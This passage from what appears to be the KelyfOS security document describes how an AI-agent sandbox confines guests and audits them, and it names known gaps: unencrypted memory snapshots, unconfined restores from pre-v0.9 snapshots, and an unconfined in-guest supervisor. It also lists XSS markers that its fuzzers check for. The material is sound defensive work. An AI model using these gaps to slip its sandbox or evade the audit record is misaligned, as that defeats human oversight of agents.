a **memory image of a booted guest**, written under `~/.cache/kelyfos`. Anything
that was in that guest's RAM at the moment it was frozen is in that file.

KelyfOS keeps the directories `0700` and takes the group and world bits off the
image files themselves, so they are private to the user who made them. That is
the whole of the protection: they are not encrypted, and a backup tool or a
shared home directory will carry them wherever it carries anything else.

A fork template specifically is booted with no egress, no bound secrets and no
workspace, and nothing is run inside it before it is frozen — so what it holds
is a freshly booted machine and nothing that came from you. A snapshot *you*
take with `kelyfos snapshot save` is a different matter: whatever the agent had
in memory is in it.

**A snapshot also carries the authority of the version that took it.** Restoring
one does not upgrade the guest inside it: a snapshot taken before v0.9 restores
into a supervisor with no confinement code in it, so nothing that machine spawns
is confined by Landlock or by the guest seccomp profile, however new the
`kelyfos` doing the restoring is.

What that does *not* change is the host side. The jailer, the VMM's own syscall
filter, the egress policy and the cgroup are properties of the run being started
now, not of the snapshot, and all four still apply. Guest confinement is depth
behind a boundary that still holds — which is why such a restore is **warned
about and not refused** (D32): refusing would make old snapshots unusable to buy
nothing the boundary does not already give.

Two things make it impossible to miss. The restore says so on the terminal, with
the fix that actually fixes it — re-create the snapshot under this version — and
`session.ready` in the flight recorder carries the guest profile, so its absence
is a recorded fact rather than a silence. A transcript can never make an
unconfined-guest run look like a confined one. The field is in the JSONL;
`kelyfos log`'s rendered output does not print it yet, so read the record rather
than the rendering when the question is which walls were up.

### Data at rest
Snapshots and workspace images are ordinary files on the host with no
encryption. A snapshot contains the guest's entire memory — including anything
the agent was holding at the time.

### Multi-tenancy
KelyfOS is a single-host developer tool. It has no accounts, no authorisation
and no isolation between users of the same machine. Anyone who can run `kelyfos`
can read every session record and attach to every running sandbox.

### The KelyfOS CLI's own parsers (v1.0)

Everything above is about what a guest may *do*. This is about what the host may
*read*, which is a different question with the same answer at the end: the host
is the party with something to lose, so every byte it parses from somewhere else
is somewhere else's choice of byte.

Three sources are treated as hostile, and the word is meant literally rather
than as caution:

- **Anything a guest wrote.** The whole host/guest wire — the newline-delimited
  JSON framing, the length-prefixed shell channel, the port-forward handshake,
  guest events, team messages, and the MCP responses that come back through the
  bridge. A guest runs whatever the agent decided to run.
- **Anything the network returned.** An allowlisted domain is not a trusted one,
  and the proxy parses both the request the guest composed and the response the
  upstream sent. This is the sharpest of the three, because for a secret-bound
  domain the proxy attaches a credential to the request it just parsed: policy
  and destination are derived from the same parse, so a parsing bug is not a
  crash but a credential handed somewhere the policy never approved.
- **Anything that arrives with a repository or a download.** `kelyfos.toml` is
  meant to be committed and cloned, so a policy file is a stranger's file; an
  `image.json` comes from a release you fetched. Reading a stranger's project
  should not be able to break the tool that is supposed to contain it.

What is deliberately **not** on this list: the state KelyfOS writes to its own
cache for its own use. A corrupt sandbox state file is a bug worth fixing and is
not an adversary, and calling it one would make the word mean nothing.

Nineteen Go fuzz targets cover the hostile side of that line. They run for ten
seconds each on every commit and for minutes each on a schedule, and the runner
*discovers* the targets rather than listing them, so one added later cannot be
quietly left out.

What that covers, stated rather than summarised as "the parsers", because the
useful question is which ones: the framing of every host/guest channel, and the
decode of each message type the host reads from a guest; the policy parsers —
`kelyfos.toml`, `--secret`, and the proxy's target parse that every allowlist
decision keys on; the proxy's response scrubber, which is the one component that
rewrites bytes the agent is about to parse; the flight recorder; the argument
summarisers on both sides of the MCP surface; the shim's shell quoting and the
base64 decoder that turns guest output back into file contents for an SDK
client; and, since v1.0, the extractor that takes a record back out of an
exported report — the one file in this product that arrives from *outside* it,
sent by whoever wants you to read it.

Where a function has a property worth more than "does not crash", the harness
asserts the property instead — that `Verify` and `Read` agree about a chain,
that a credential matches the domain it was just bound to, that an argument
carrying content is never written into the record verbatim, that a shell-quoted
string survives a shell unchanged.

What is **not** fuzzed, and why: the image manifest is `encoding/json` decoding
into a typed struct, so a harness there measures the standard library; and the
MCP observer's request/response pairing is state rather than parsing. These are
named so the list above reads as a boundary rather than as everything somebody
got to.

*Writing* the exported HTML report goes through `html/template`, which escapes
`< > & ' "` by construction — but P7-8 found that construction is not the whole
claim: `html/template`'s contextual escaping does not touch a raw control byte
(0x00-0x08, 0x0B, 0x0C, 0x0E-0x1F, 0x7F), so an agent name, a store key or a
path carrying one reached the rendered page unescaped, in the flat timeline and
the lane view exactly as much as in the run map, the agent sheets, the reach
matrix and the store panel P7-8 adds. `internal/report/safe.go`'s `safe` (an
identity-like value — an agent name, a domain, a key — goes through
`proto.SafeText`, the same "quote the whole string" rule already used for a
boot line) and `safeBody` (a command's captured output or a message body, kept
multi-line: only the dangerous byte is replaced, with U+FFFD) are what stand
between a guest-influenced string and the template now. Both predicates were
ASCII-only until P7-17/F1, which is a second thing construction did not cover:
`html/template` does not touch a `U+202E` either, and neither did they. and
`FuzzRunSectionRendersHostileStringsSafely` fuzzes an agent name, a store key, a
domain and a secret name through a real render and checks for a live
`<script>`, an event-handler attribute, a `javascript:` URL and a raw control
byte, tag boundary by tag boundary rather than by page-wide substring search
(a payload deliberately planted as escaped *text* would otherwise read as a
false positive). The *write* path is fuzzed now too, not only the *read*
(extraction) path.

Seven defects came out of writing them, and they are the reason this section
does not simply say the parsers are careful. Two were silent-failure bugs rather
than crashes — a credential bound to `github.com.` never attached to anything,
and a `mem` ceiling large enough to overflow became *negative* — and three were
places where agent-chosen text reached a rendered line of the transcript.
Running them since has found two more of the silent kind, both from the
scheduled run rather than from writing a harness: `--secret T@..` normalised to
a domain no host could ever match, because the host side trims one trailing dot
from the name it is asked about and the domain kept the other, so `0..` bound
`0.` and matched nothing a normalised host could ever be.

## 5. Trust boundaries

| Boundary | Enforced by | Status |
| --- | --- | --- |
| guest → host | Firecracker + KVM | active; the VMM is jailed and filtered since v0.9 |
| guest → network | no NIC, or TAP + nftables + proxy | active |
| guest → credentials | injection at the proxy | active |
| guest → audit record | host-side, hash-chained | active, including under `kelyfos shim` |
| guest → host filesystem, via the workspace disk | the image is enumerated and validated before it is read, and extracted through `openat2(RESOLVE_BENEATH\|RESOLVE_NO_SYMLINKS)` | active since v1.0. **This row did not exist until an external audit found what its absence cost** — see below |
| a report → whoever received it | the record travels in the file; `kelyfos verify`, and `--sign-key` / `--key` when the reader already holds the key | active since v1.0; covers the record, not the rendering, and a chain cut short at its end still verifies |
| guest → guest (team) | host broker + declared edge list | active |
| guest → host CPU/RAM/IO | KVM config, cgroup v2, rate limiters | active, and only when configured |
| host process → host | the jailer | active (P5-1); `--no-jail` turns it off and says so on every run |
| in-guest process → guest | Landlock + seccomp | active (P5-3) for every process the supervisor spawns; the supervisor itself is not confined, and its own file tools are held to the profile's writable lists by an in-process check. Absent on images and snapshots made before v0.9, which is warned about rather than refused |

## 6. If you are evaluating KelyfOS

Reasonable today: running untrusted agent code on a machine where you accept
that a Firecracker escape reaches your user account; keeping credentials out of
agent reach; producing a checkable record of what an agent did.

Not reasonable today: multi-tenant hosting; anything where a VMM compromise is
unacceptable; regulated workloads needing encryption at rest; anything relying
on a hardened guest.

## 7. Reporting a vulnerability

Do not open a public issue. [`SECURITY.md`](../SECURITY.md) has the channel and
the scope — including the list of things that are deliberate design decisions
rather than findings, so you can check before writing.
